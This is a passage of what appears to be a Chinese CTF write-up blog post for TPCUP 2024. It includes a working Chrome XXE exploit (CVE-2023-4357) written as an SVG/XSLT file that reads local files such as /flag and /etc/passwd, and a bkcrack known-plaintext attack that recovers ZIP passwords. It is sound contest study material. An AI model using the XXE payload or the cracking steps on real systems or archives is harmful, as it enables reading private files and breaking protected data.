<!DOCTYPE HTML><html lang="zh-CN"><head><meta charset="utf-8"><meta name="keywords" content="躺平杯, 求知欲，好奇心，勇毅前行"><meta name="description" content="TPCUP 2024X…什么？看到 chrome-114.0.5735.90 搜索下这个版本可以找到 CVE-2023-4357 漏洞复现，使用 xcanwin&amp;#x2F;CVE-2023-4357-Chrome-XXE 的单文件 EXP，"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><meta name="renderer" content="webkit|ie-stand|ie-comp"><meta name="mobile-web-app-capable" content="yes"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="referrer" content="no-referrer-when-downgrade"><title>躺平杯 | 求知欲，好奇心，勇毅前行</title><link rel="icon" type="image/png" href="/favicon.png"><link rel="stylesheet" href="/libs/awesome/css/all.min.css"><link rel="stylesheet" href="/libs/materialize/materialize.min.css"><link rel="stylesheet" href="/libs/aos/aos.css"><link rel="stylesheet" href="/libs/animate/animate.min.css"><link rel="stylesheet" href="/libs/lightGallery/css/lightgallery.min.css"><link rel="stylesheet" href="/css/matery.css"><link rel="stylesheet" href="/css/my.css"><link rel="stylesheet" href="/css/dark.css" media="none" onload='"all"!=media&&(media="all")'><link rel="stylesheet" href="/libs/tocbot/tocbot.css"><link rel="stylesheet" href="/css/post.css"><script src="/libs/jquery/jquery-3.6.0.min.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="求知欲，好奇心，勇毅前行" type="application/atom+xml"></head><body><header class="navbar-fixed"><nav id="headNav" class="bg-color nav-transparent"><div id="navContainer" class="nav-wrapper container"><div class="brand-logo"><a href="/" class="waves-effect waves-light"><img src="/medias/logo.png" class="logo-img" alt="LOGO"> <span class="logo-span">求知欲，好奇心，勇毅前行</span></a></div><a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a><ul class="right nav-menu"><li class="hide-on-med-and-down nav-item"><a href="/" class="waves-effect waves-light"><i class="fas fa-home" style="zoom:.6"></i> <span>首页</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fas fa-archive" style="zoom:.6"></i> <span>归档</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/about" class="waves-effect waves-light"><i class="fas fa-user-circle" style="zoom:.6"></i> <span>关于</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/contact" class="waves-effect waves-light"><i class="fas fa-comments" style="zoom:.6"></i> <span>留言板</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/friends" class="waves-effect waves-light"><i class="fas fa-address-book" style="zoom:.6"></i> <span>友情链接</span></a></li><li><a href="#searchModal" class="modal-trigger waves-effect waves-light"><i id="searchIcon" class="fas fa-search" title="搜索" style="zoom:.85"></i></a></li><li><a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式"><i id="sum-moon-icon" class="fas fa-sun" style="zoom:.85"></i></a></li></ul><div id="mobile-nav" class="side-nav sidenav"><div class="mobile-head bg-color"><img src="/medias/logo.png" class="logo-img circle responsive-img"><div class="logo-name">求知欲，好奇心，勇毅前行</div><div class="logo-desc">网安逆向</div></div><ul class="menu-list mobile-menu-list"><li class="m-nav-item"><a href="/" class="waves-effect waves-light"><i class="fa-fw fas fa-home"></i> 首页</a></li><li class="m-nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fa-fw fas fa-archive"></i> 归档</a></li><li class="m-nav-item"><a href="/about" class="waves-effect waves-light"><i class="fa-fw fas fa-user-circle"></i> 关于</a></li><li class="m-nav-item"><a href="/contact" class="waves-effect waves-light"><i class="fa-fw fas fa-comments"></i> 留言板</a></li><li class="m-nav-item"><a href="/friends" class="waves-effect waves-light"><i class="fa-fw fas fa-address-book"></i> 友情链接</a></li><li><div class="divider"></div></li><li><a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank"><i class="fab fa-github-square fa-fw"></i>Fork Me</a></li></ul></div></div><style>.nav-transparent .github-corner{display:none!important}.github-corner{position:absolute;z-index:10;top:0;right:0;border:0;transform:scale(1.1)}.github-corner svg{color:#0f9d58;fill:#fff;height:64px;width:64px}.github-corner:hover .octo-arm{animation:a .56s ease-in-out}.github-corner .octo-arm{animation:none}@keyframes a{0%,to{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}</style><a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a></nav></header><div class="bg-cover pd-header post-cover" style="background-image:url(/medias/featureimages/22.jpg)"><div class="container" style="right:0;left:0"><div class="row"><div class="col s12 m12 l12"><div class="brand"><h1 class="description center-align post-title">躺平杯</h1></div></div></div></div></div><main class="post-container content"><div class="row"><div id="main-content" class="col s12 m12 l9"><div id="artDetail"><div class="card"><div class="card-content article-info"><div class="row tag-cate"><div class="col s7"><div class="article-tag"><span class="chip bg-color">无标签</span></div></div><div class="col s5 right-align"></div></div><div class="post-info"><div class="post-date info-break-policy"><i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp; 2024-02-26</div></div></div><hr class="clearfix"><div class="card-content article-card-content"><div id="articleContent"><h1 id="TPCUP-2024"><a href="#TPCUP-2024" class="headerlink" title="TPCUP 2024"></a>TPCUP 2024</h1><h2 id="X…什么？"><a href="#X…什么？" class="headerlink" title="X…什么？"></a>X…什么？</h2><p>看到 chrome-114.0.5735.90 搜索下这个版本可以找到 CVE-2023-4357 漏洞复现，使用 <a href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">xcanwin&#x2F;CVE-2023-4357-Chrome-XXE</a> 的单文件 EXP，改成读取 flag，然后加上写入 cookies 的代码。</p><p>由于同时要有 svg 和 xml 解析，所以 Content-Type 设为 <code>image/svg+xml</code>，可以自己搭建本地环境看看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- d.svg --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&amp;passwd_p;&quot;</span>&gt;</span>&amp;passwd_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(p =&amp;gt; &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">cookie</span>=p.<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传后访问 <code>/d.svg</code> 即可</p><p><code>flag&#123;XXE_is_alSo_y0ur_g0oD_fR13Nd&#125;</code></p><blockquote><p>没修前已经能读 <code>/etc/passwd</code> 了，但读 <code>/flag</code> 没结果。以为是没权限需要提权，结果是没放 flag（<br>话说为什么读得了 <code>/usr/src/app/requirements.txt</code> 但读不了 <code>xssbot.py</code> 呢</p></blockquote><h2 id="Uncrackable"><a href="#Uncrackable" class="headerlink" title="Uncrackable"></a>Uncrackable</h2><h3 id="更新附件后"><a href="#更新附件后" class="headerlink" title="更新附件后"></a>更新附件后</h3><p>zip 已知明文攻击，用 <code>zipinfo</code> 查看下压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ zipinfo prob05.zip</span><br><span class="line">Archive:  prob05.zip</span><br><span class="line">Zip file size: 3545476 bytes, number of entries: 2</span><br><span class="line">-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js</span><br><span class="line">-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a</span><br><span class="line">2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%</span><br></pre></td></tr></table></figure><p><code>anticheat.js</code> 文件是已知的，可以从 <a href="https://www.tpcup.org/anticheat.js">https://www.tpcup.org/anticheat.js</a> 下载，需要压缩后才可以用工具 (bkcrack&#x2F;rbkcrack&#x2F;pkcrack) 爆破密钥</p><p>这题和压缩工具关系很大，使用 <code>pyminizip == 0.2.6</code> 在 <code>compress_level = 0 or 6</code> 下可以成功，<code>zip = 3.0-11.1</code> 和 <code>7z = 23.01</code> 均失败 <del>，还是在群聊中得知的压缩工具</del></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crypto.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyminizip</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;level:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pyminizip.compress(<span class="string">&quot;anticheat.js&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;anticheat.zip&quot;</span>, <span class="literal">None</span>, i)</span><br><span class="line">    <span class="comment"># os.system(&quot;zip -%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    <span class="comment"># os.system(&quot;7z a -tzip -mx%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    os.system(<span class="string">&quot;bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:0</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[21:59:49] Z reduction using 44370 bytes of known plaintext</span><br><span class="line">26.0 % (11536 / 44370)</span><br><span class="line">[21:59:50] Attack on 155 Z values at index 33459</span><br><span class="line">Keys: d0043c88 20e5781d 2160b96d</span><br><span class="line">94.8 % (147 / 155)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 147</span><br><span class="line">[21:59:50] Keys</span><br><span class="line">d0043c88 20e5781d 2160b96d</span><br></pre></td></tr></table></figure><p>用密钥获取压缩包密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:42:55] Recovering password</span><br><span class="line">length 12...</span><br><span class="line">Password: bQCvRH7q1ULs</span><br><span class="line">60.4 % (2321 / 3844)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the password recovery with the option: --continue-recovery 625151303030</span><br><span class="line">[22:42:59] Password</span><br><span class="line">as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73</span><br><span class="line">as text: bQCvRH7q1ULs</span><br></pre></td></tr></table></figure><p>用密码解压之后查看 uncrackable.m4a 末尾的附加字符 <code>strings uncrackable.m4a | grep flag</code></p><p><code>flag&#123;z1p_IsN7_5ucH_S4f3&#125;</code></p><h3 id="下面是之前的附件的错误解法"><a href="#下面是之前的附件的错误解法" class="headerlink" title="下面是之前的附件的错误解法"></a>下面是之前的附件的错误解法</h3><p>之前的附件，给出提示部分 M4A 头字节(摩斯密码，五位一组) <code>7479706d7000000</code> 补个 0 就有 8 位，我以为是这个是压缩后的，猜测前三位是 <code>000000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[00:47:57] Attack on 4194304 Z values at index 12</span><br><span class="line">Keys: 5bb795f4 424af6b2 acadf670</span><br><span class="line">43.6 % (1828975 / 4194304)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1828975</span><br><span class="line">[01:02:46] Keys</span><br><span class="line">5bb795f4 424af6b2 acadf670</span><br></pre></td></tr></table></figure><p>可以爆出密钥（但是是错误的），所以最后解密压缩包的时候提示文件损坏 <code>zlib.error: Error -3 while decompressing data: invalid stored block lengths</code> 可惜</p><h3 id="下面可能是正确的解法"><a href="#下面可能是正确的解法" class="headerlink" title="下面可能是正确的解法"></a>下面可能是正确的解法</h3><p>zip 明文攻击至少需要 12 位字符，其中 8 位要连续<br>这个压缩包的 <code>compress_level == 5</code>，提示的是 M4A 头，但不是连续的。第 0-2 位是 <code>000000</code>，搜索文件头可以查到第 3 位一般是 <code>20</code>，但我生成了一个文件第 3 位是 <code>1C</code>。。。<br>第 4-9 位是 <code>667479706070</code> 就是提示的，但现在只有 10 位，还需要两位。可以随机抓后面的空白部分来补充位数，之后就可能可以正常爆破密钥了（没爆出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:5</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:16:14] Z reduction using 1048569 bytes of known plaintext</span><br><span class="line">0.8 % (8070 / 1048569)</span><br><span class="line">[22:16:15] Attack on 130 Z values at index 1041024</span><br><span class="line">Keys: a08fc77f 1dd36012 734e2126</span><br><span class="line">76.2 % (99 / 130)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 99</span><br><span class="line">[22:16:15] Keys</span><br><span class="line">a08fc77f 1dd36012 734e2126</span><br></pre></td></tr></table></figure><p>压缩包密码是：<code>D0mbgaf6OhNp</code> 解密即可</p><blockquote><p>uncrackable.m4a 是周深的 Unstoppable （挺配的</p></blockquote><h2 id="非常好忽悠混合"><a href="#非常好忽悠混合" class="headerlink" title="非常好忽悠混合"></a>非常好忽悠混合</h2><p>flag1 找个哔站视频下载的解析下原始标题得到（在去年的时候就知道了<br>flag2 在视频的第二帧出现（一眼</p><p><code>flag&#123;h0W_d0_y0U_kN0w_mY_V1d3O_n4M3&#125;</code><br><code>flag&#123;f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3&#125;</code></p><h2 id="心中无码，自然高清"><a href="#心中无码，自然高清" class="headerlink" title="心中无码，自然高清"></a>心中无码，自然高清</h2><p>这题是连蒙带猜的，基本思路就是遍历字符生成马赛克，看和密文是否一致（或误差很小）<br>到下划线要更改 44&#x2F;45 行，为 <code>ll = len(flag) - 1</code> 调整枚举中间位置，如果为空可以跳过，这样能得到 <code>flag&#123;lag&#123;ev3R tH1</code> 如果没有结果可以把 50 行取消注释，输出差别较小的字母，再猜下能还原 flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageChops</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">flag = <span class="string">r&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="number">255</span>:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">    H = <span class="number">68</span></span><br><span class="line">    W = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    canvas = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (W * <span class="built_in">len</span>(flag), H), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    font = ImageFont.truetype(</span><br><span class="line">        <span class="string">&#x27;./JetBrainsMono-Regular.ttf&#x27;</span>, <span class="number">56</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pen = ImageDraw.Draw(canvas)</span><br><span class="line">    pen.text((<span class="number">0</span>, <span class="number">0</span>), flag, <span class="string">&#x27;black&#x27;</span>, font)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_uncensored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        char = canvas.crop((W * i, <span class="number">0</span>, W * (i + <span class="number">1</span>), H))</span><br><span class="line">        char.save(<span class="string">f&#x27;./tmp_char/char_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mosaic_img</span>(<span class="params">img: Image.Image, L, H, R, D</span>):</span><br><span class="line">        w, h = R - L, D - H</span><br><span class="line">        a = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">                j = img.getpixel((L + x, H + y))</span><br><span class="line">                <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">                    a[ch] += j[ch]</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        b = [k // cnt <span class="keyword">for</span> k <span class="keyword">in</span> a]</span><br><span class="line">        mosaic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (w, h), <span class="built_in">tuple</span>(b))</span><br><span class="line">        img.paste(mosaic, (L, H, R, D))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        mosaic_img(canvas, W * i, <span class="number">0</span>, W * i + W, H // <span class="number">2</span>)</span><br><span class="line">        mosaic_img(canvas, W * i, H // <span class="number">2</span>, W * i + W, H)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_censored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    f = Image.<span class="built_in">open</span>(<span class="string">&#x27;./70.png&#x27;</span>)</span><br><span class="line">    censored = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag_censored.png&#x27;</span>)</span><br><span class="line">    ll = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="comment"># ll = len(flag) - 1</span></span><br><span class="line">    cropped_region = f.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">    <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(&quot;not best&quot;, chr(k), diff.getextrema())</span></span><br><span class="line">        cropped_region = f.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">        <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(k), diff.getextrema())</span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><code>flag&#123;ev3RytH1ng_1s_Cl3Ar&#125;</code></p><h2 id="躺平问答"><a href="#躺平问答" class="headerlink" title="躺平问答"></a>躺平问答</h2><blockquote><p>上周，身为2024届英才计划培养对象的出题人ZianTT参加了一次冬令营，请问他的活动大致地点是？（七个汉字）</p></blockquote><p>不会有人不止到 HIT 吧（</p><blockquote><p>在2023年，Cloudflare因为机房停电导致大量服务不可用，Cloudflare官方博客记载此时的英文版链接是：</p></blockquote><p>如何干翻 CloudFlare？给它的数据中心拉闸（，在 cf 的 blog 可以找到 （或者直接搜</p><blockquote><p>QQ上线了新春活动，但糟糕的体验显然引发了一些用户的困扰，关闭该功能的链接是？（一个由https:&#x2F;&#x2F;开始的链接）</p></blockquote><p>这是最后才出的题，本来以为要前几年的关闭入口，结果填今年的表单就行，在 QA 群里可以找到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提示</span><br><span class="line">QQ 春节活动关闭登记表</span><br><span class="line">https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB</span><br><span class="line">设置 - 关于 QQ 与帮助 - 反馈 - 「如何关闭春节红包活动」</span><br><span class="line">2024-02-06</span><br><span class="line">15.6K viewsedited  </span><br><span class="line">12:29</span><br></pre></td></tr></table></figure><blockquote><p>HTCPCP是一种类似HTTP的协议，用于控制咖啡壶，其中，当发送了BREW请求来冲泡的时候，如果服务认为请求的添加项组合违背了饮酒者对所述种类的共识，返回的状态码是：</p></blockquote><p>懒得看就把文档的状态码都试下</p><blockquote><p>OpenAI在2024年1月发生了多少运行事件(以公示数据为准 )：</p></blockquote><p>goto <a href="https://status.openai.com/history">https://status.openai.com/history</a> 数下一月份的数据</p><blockquote><p>比赛平台域名tpcup.org的Registry Domain ID 是：</p></blockquote><p>在 <a href="https://lookup.icann.org/en/lookup">https://lookup.icann.org/en/lookup</a> 查到</p><blockquote><p>本次比赛计算服务提供商所在主体纳税人识别号是：（18位由数字和大写字母组成的字符串）</p></blockquote><p>赞助商是晞云，在官网给出了公司名，搜索一下纳税人识别号就行</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_1&quot;</span><span 